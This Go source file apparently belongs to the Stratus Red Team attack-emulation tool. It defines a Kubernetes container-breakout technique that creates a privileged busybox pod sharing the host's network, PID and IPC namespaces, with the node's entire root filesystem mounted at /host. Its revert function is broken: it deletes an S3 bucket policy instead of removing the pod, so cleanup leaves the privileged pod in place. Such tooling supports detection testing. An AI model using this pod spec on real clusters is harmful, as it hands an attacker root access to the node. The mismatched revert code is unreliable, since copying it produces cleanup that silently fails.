package kubernetes

import (
	"context"
	"log"

	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/utils/pointer"
)

var nodeRootPodSpec = v1.Pod{
	Spec: v1.PodSpec{
		HostNetwork: true,
		HostPID:     true,
		HostIPC:     true,
		Containers: []v1.Container{
			{
				Name:    "avml",
				Image:   "busybox:stable",
				Command: []string{"sleep"},
				Args:    []string{"6000"},

				VolumeMounts: []v1.VolumeMount{
					{
						Name:      "hostfs",
						MountPath: "/host",
					},
				},
				SecurityContext: &v1.SecurityContext{
					Privileged: pointer.Bool(true),
				},
			},
		},
		Volumes: []v1.Volume{
			{
				Name: "hostfs",
				VolumeSource: v1.VolumeSource{
					HostPath: &v1.HostPathVolumeSource{
						Path: "/",
					},
				},
			},
		},
	},
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.privilege-escalation.hostpath-volume",
		FriendlyName:       "Container breakout via hostPath volume mount",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.PrivilegeEscalation},
		Description: `
Creates a Pod with the entire node root filesystem as a hostPath volume mount

Warm-up: 

- Creates the Stratus Red Team namespace
- Creates a local Kind cluster if desired

Detonation: 

- Create a privileged busybox pod with the node root filesystem mounted at "/host"
`,
		Detonate: detonate,
		Revert:   revert,
	})
}

func detonate(params map[string]string) error {
	client, err := providers.K8sClient(params["kube_config"])
	if err != nil {
		return err
	}

	_, err = client.CoreV1().Pods(params["namespace"]).Create(
		context.Background(),
		&nodeRootPodSpec,
		metav1.CreateOptions{},
	)
	return err
}

func revert(params map[string]string) error {
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())
	bucketName := params["bucket_name"]

	log.Println("Removing malicious bucket policy on " + bucketName)
	_, err := s3Client.DeleteBucketPolicy(context.Background(), &s3.DeleteBucketPolicyInput{
		Bucket: &bucketName,
	})

	return err
}
